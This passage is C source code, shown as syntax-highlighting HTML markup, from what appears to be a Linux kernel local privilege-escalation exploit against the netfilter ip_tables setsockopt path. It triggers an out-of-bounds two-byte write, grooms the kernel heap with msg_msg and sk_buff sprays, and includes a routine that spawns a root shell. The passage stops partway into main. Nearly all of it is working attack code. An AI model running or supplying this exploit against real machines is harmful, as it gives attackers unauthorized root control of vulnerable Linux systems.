<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;netinet/in.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;err.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/netfilter_ipv4/ip_tables.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/netfilter/x_tables.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;errno.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sched.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;inttypes.h></span></span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">PAGE_SIZE</span> <span class="token expression"><span class="token number">0x1000</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">PRIMARY_SIZE</span> <span class="token expression"><span class="token number">0x1000</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">SECONDARY_SIZE</span> <span class="token expression"><span class="token number">0x400</span></span></span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">NUM_SOCKETS</span> <span class="token expression"><span class="token number">4</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">NUM_SKBUFFS</span> <span class="token expression"><span class="token number">128</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">NUM_PIPEFDS</span> <span class="token expression"><span class="token number">128</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">NUM_MSQIDS</span> <span class="token expression"><span class="token number">4096</span></span></span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">HOLE_STEP</span> <span class="token expression"><span class="token number">1024</span></span></span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MTYPE_PRIMARY</span> <span class="token expression"><span class="token number">0x41</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MTYPE_SECONDARY</span> <span class="token expression"><span class="token number">0x42</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MTYPE_FAKE</span> <span class="token expression"><span class="token number">0x1337</span></span></span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MSG_TAG</span> <span class="token expression"><span class="token number">0xAAAAAAAA</span></span></span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">SKB_SHARED_INFO_SIZE</span> <span class="token expression"><span class="token number">0x140</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MSG_MSG_SIZE</span> <span class="token expression"><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">msg_msg</span><span class="token punctuation">)</span><span class="token punctuation">)</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MSG_MSGSEG_SIZE</span> <span class="token expression"><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">msg_msgseg</span><span class="token punctuation">)</span><span class="token punctuation">)</span></span></span>

<span class="token keyword">struct</span> <span class="token class-name">msg_msg</span>
<span class="token punctuation">&#123;</span>
    <span class="token class-name">uint64_t</span> m_list_next<span class="token punctuation">;</span>
    <span class="token class-name">uint64_t</span> m_list_prev<span class="token punctuation">;</span>
    <span class="token class-name">uint64_t</span> m_type<span class="token punctuation">;</span>
    <span class="token class-name">uint64_t</span> m_ts<span class="token punctuation">;</span>
    <span class="token class-name">uint64_t</span> next<span class="token punctuation">;</span>
    <span class="token class-name">uint64_t</span> security<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

<span class="token keyword">struct</span> <span class="token class-name">msg_msgseg</span>
<span class="token punctuation">&#123;</span>
    <span class="token class-name">uint64_t</span> next<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

<span class="token keyword">struct</span> <span class="token class-name">pipe_buffer</span>
<span class="token punctuation">&#123;</span>
    <span class="token class-name">uint64_t</span> page<span class="token punctuation">;</span>
    <span class="token class-name">uint32_t</span> offset<span class="token punctuation">;</span>
    <span class="token class-name">uint32_t</span> len<span class="token punctuation">;</span>
    <span class="token class-name">uint64_t</span> ops<span class="token punctuation">;</span>
    <span class="token class-name">uint32_t</span> flags<span class="token punctuation">;</span>
    <span class="token class-name">uint32_t</span> pad<span class="token punctuation">;</span>
    <span class="token class-name">uint64_t</span> private<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

<span class="token keyword">struct</span> <span class="token class-name">pipe_buf_operations</span>
<span class="token punctuation">&#123;</span>
    <span class="token class-name">uint64_t</span> confirm<span class="token punctuation">;</span>
    <span class="token class-name">uint64_t</span> release<span class="token punctuation">;</span>
    <span class="token class-name">uint64_t</span> steal<span class="token punctuation">;</span>
    <span class="token class-name">uint64_t</span> get<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

<span class="token keyword">struct</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">long</span> mtype<span class="token punctuation">;</span>
    <span class="token keyword">char</span> mtext<span class="token punctuation">[</span>PRIMARY_SIZE <span class="token operator">-</span> MSG_MSG_SIZE<span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> msg_primary<span class="token punctuation">;</span>

<span class="token keyword">struct</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">long</span> mtype<span class="token punctuation">;</span>
    <span class="token keyword">char</span> mtext<span class="token punctuation">[</span>SECONDARY_SIZE <span class="token operator">-</span> MSG_MSG_SIZE<span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> msg_secondary<span class="token punctuation">;</span>

<span class="token keyword">struct</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">long</span> mtype<span class="token punctuation">;</span>
    <span class="token keyword">char</span> mtext<span class="token punctuation">[</span>PAGE_SIZE <span class="token operator">-</span> MSG_MSG_SIZE <span class="token operator">+</span> PAGE_SIZE <span class="token operator">-</span> MSG_MSGSEG_SIZE<span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> msg_fake<span class="token punctuation">;</span>

<span class="token keyword">void</span> <span class="token function">getRootShell</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\033[32m\033[1m[+] Backing from the kernelspace.\033[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">getuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\033[31m\033[1m[x] Failed to get the root!\033[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\033[32m\033[1m[+] Successful to get the root. Execve root shell "</span>
         <span class="token string">"now...\033[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// to exit the process normally instead of segmentation fault</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">trigger_oob_write</span><span class="token punctuation">(</span><span class="token keyword">int</span> s<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">struct</span> <span class="token class-name">__attribute__</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__packed__<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">struct</span> <span class="token class-name">ipt_replace</span> replace<span class="token punctuation">;</span>  <span class="token comment">// 0x5c</span>
        <span class="token keyword">struct</span> <span class="token class-name">ipt_entry</span> entry<span class="token punctuation">;</span>      <span class="token comment">// 0x70</span>
        <span class="token keyword">struct</span> <span class="token class-name">xt_entry_match</span> match<span class="token punctuation">;</span> <span class="token comment">// 0x20</span>
        <span class="token keyword">char</span> match_data<span class="token punctuation">[</span>PAGE_SIZE <span class="token operator">-</span> <span class="token number">0x40</span> <span class="token operator">-</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">ipt_entry</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">xt_entry_match</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">xt_entry_target</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">8</span> <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">struct</span> <span class="token class-name">xt_entry_target</span> target<span class="token punctuation">;</span> <span class="token comment">// 0x20</span>
    <span class="token punctuation">&#125;</span> data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

    data<span class="token punctuation">.</span>replace<span class="token punctuation">.</span>num_counters <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    data<span class="token punctuation">.</span>replace<span class="token punctuation">.</span>num_entries <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    data<span class="token punctuation">.</span>replace<span class="token punctuation">.</span>size <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>entry<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>match<span class="token punctuation">)</span> <span class="token operator">+</span>
                         <span class="token keyword">sizeof</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>match_data<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>target<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    data<span class="token punctuation">.</span>entry<span class="token punctuation">.</span>next_offset <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>entry<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>match<span class="token punctuation">)</span> <span class="token operator">+</span>
                              <span class="token keyword">sizeof</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>match_data<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>target<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    data<span class="token punctuation">.</span>entry<span class="token punctuation">.</span>target_offset <span class="token operator">=</span>
        <span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>entry<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>match<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>match_data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    data<span class="token punctuation">.</span>match<span class="token punctuation">.</span>u<span class="token punctuation">.</span>user<span class="token punctuation">.</span>match_size <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>match<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>match_data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">strcpy</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>match<span class="token punctuation">.</span>u<span class="token punctuation">.</span>user<span class="token punctuation">.</span>name<span class="token punctuation">,</span> <span class="token string">"icmp"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    data<span class="token punctuation">.</span>match<span class="token punctuation">.</span>u<span class="token punctuation">.</span>user<span class="token punctuation">.</span>revision <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

    data<span class="token punctuation">.</span>target<span class="token punctuation">.</span>u<span class="token punctuation">.</span>user<span class="token punctuation">.</span>target_size <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>target<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 0x20</span>
    <span class="token function">strcpy</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>target<span class="token punctuation">.</span>u<span class="token punctuation">.</span>user<span class="token punctuation">.</span>name<span class="token punctuation">,</span> <span class="token string">"NFQUEUE"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    data<span class="token punctuation">.</span>target<span class="token punctuation">.</span>u<span class="token punctuation">.</span>user<span class="token punctuation">.</span>revision <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>

    <span class="token comment">// Partially overwrite the adjacent buffer with 2 bytes of zero.</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">setsockopt</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> SOL_IP<span class="token punctuation">,</span> IPT_SO_SET_REPLACE<span class="token punctuation">,</span> <span class="token operator">&amp;</span>data<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>errno <span class="token operator">==</span> ENOPROTOOPT<span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[-] error ip_tables module is not loaded.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">setup_sandbox</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">unshare</span><span class="token punctuation">(</span>CLONE_NEWUSER<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"[-] unshare(CLONE_NEWUSER)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">unshare</span><span class="token punctuation">(</span>CLONE_NEWNET<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"[-] unshare(CLONE_NEWNET)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token class-name">cpu_set_t</span> set<span class="token punctuation">;</span>
    <span class="token function">CPU_ZERO</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>set<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">CPU_SET</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>set<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">sched_setaffinity</span><span class="token punctuation">(</span><span class="token function">getpid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>set<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>set<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"[-] sched_setaffinity"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">write_msg</span><span class="token punctuation">(</span><span class="token keyword">int</span> id<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span>msgp<span class="token punctuation">,</span> <span class="token class-name">size_t</span> msgsz<span class="token punctuation">,</span> <span class="token keyword">long</span> msgtyp<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token operator">*</span><span class="token punctuation">)</span>msgp <span class="token operator">=</span> msgtyp<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">msgsnd</span><span class="token punctuation">(</span>id<span class="token punctuation">,</span> msgp<span class="token punctuation">,</span> msgsz <span class="token operator">-</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"[-] msgsnd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">read_msg</span><span class="token punctuation">(</span><span class="token keyword">int</span> id<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>msgp<span class="token punctuation">,</span> <span class="token class-name">size_t</span> msgsz<span class="token punctuation">,</span> <span class="token keyword">long</span> msgtyp<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">msgrcv</span><span class="token punctuation">(</span>id<span class="token punctuation">,</span> msgp<span class="token punctuation">,</span> msgsz <span class="token operator">-</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">,</span> msgtyp<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"[-] msgrcv"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">peek_msg</span><span class="token punctuation">(</span><span class="token keyword">int</span> id<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>msgp<span class="token punctuation">,</span> <span class="token class-name">size_t</span> msgsz<span class="token punctuation">,</span> <span class="token keyword">long</span> index<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">msgrcv</span><span class="token punctuation">(</span>id<span class="token punctuation">,</span> msgp<span class="token punctuation">,</span> msgsz <span class="token operator">-</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">,</span> index<span class="token punctuation">,</span> MSG_COPY <span class="token operator">|</span> IPC_NOWAIT<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"[-] msgrcv"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">void</span> <span class="token function">build_msg_msg</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">msg_msg</span> <span class="token operator">*</span>msg<span class="token punctuation">,</span> <span class="token class-name">uint64_t</span> m_list_next<span class="token punctuation">,</span> <span class="token class-name">uint64_t</span> m_list_prev<span class="token punctuation">,</span> <span class="token class-name">uint64_t</span> m_ts<span class="token punctuation">,</span> <span class="token class-name">uint64_t</span> next<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    msg<span class="token operator">-></span>m_list_next <span class="token operator">=</span> m_list_next<span class="token punctuation">;</span>
    msg<span class="token operator">-></span>m_list_prev <span class="token operator">=</span> m_list_prev<span class="token punctuation">;</span>
    msg<span class="token operator">-></span>m_type <span class="token operator">=</span> MTYPE_FAKE<span class="token punctuation">;</span>
    msg<span class="token operator">-></span>m_ts <span class="token operator">=</span> m_ts<span class="token punctuation">;</span>
    msg<span class="token operator">-></span>next <span class="token operator">=</span> next<span class="token punctuation">;</span>
    msg<span class="token operator">-></span>security <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">spray_skbuff</span><span class="token punctuation">(</span><span class="token keyword">int</span> ss<span class="token punctuation">[</span>NUM_SOCKETS<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span>buf<span class="token punctuation">,</span> <span class="token class-name">size_t</span> size<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> NUM_SOCKETS<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> NUM_SKBUFFS<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">write</span><span class="token punctuation">(</span>ss<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> size<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
            <span class="token punctuation">&#123;</span>
                <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"[-] write"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">free_skbuff</span><span class="token punctuation">(</span><span class="token keyword">int</span> ss<span class="token punctuation">[</span>NUM_SOCKETS<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>buf<span class="token punctuation">,</span> <span class="token class-name">size_t</span> size<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> NUM_SOCKETS<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> NUM_SKBUFFS<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">read</span><span class="token punctuation">(</span>ss<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> size<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
            <span class="token punctuation">&#123;</span>
                <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"[-] read"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token keyword">const</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">int</span> s<span class="token punctuation">;</span>
    <span class="token keyword">int</span> msqid<span class="token punctuation">[</span>NUM_MSQIDS<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> ss<span class="token punctuation">[</span>NUM_SOCKETS<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> pipefd<span class="token punctuation">[</span>NUM_PIPEFDS<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> fake_id <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> real_id <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">char</span> primary_buf<span class="token punctuation">[</span>PRIMARY_SIZE <span class="token operator">-</span> SKB_SHARED_INFO_SIZE<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">char</span> secondary_buf<span class="token punctuation">[</span>SECONDARY_SIZE <span class="token operator">-</span> SKB_SHARED_INFO_SIZE<span class="token punctuation">]</span><span class="token punctuation">;</span>
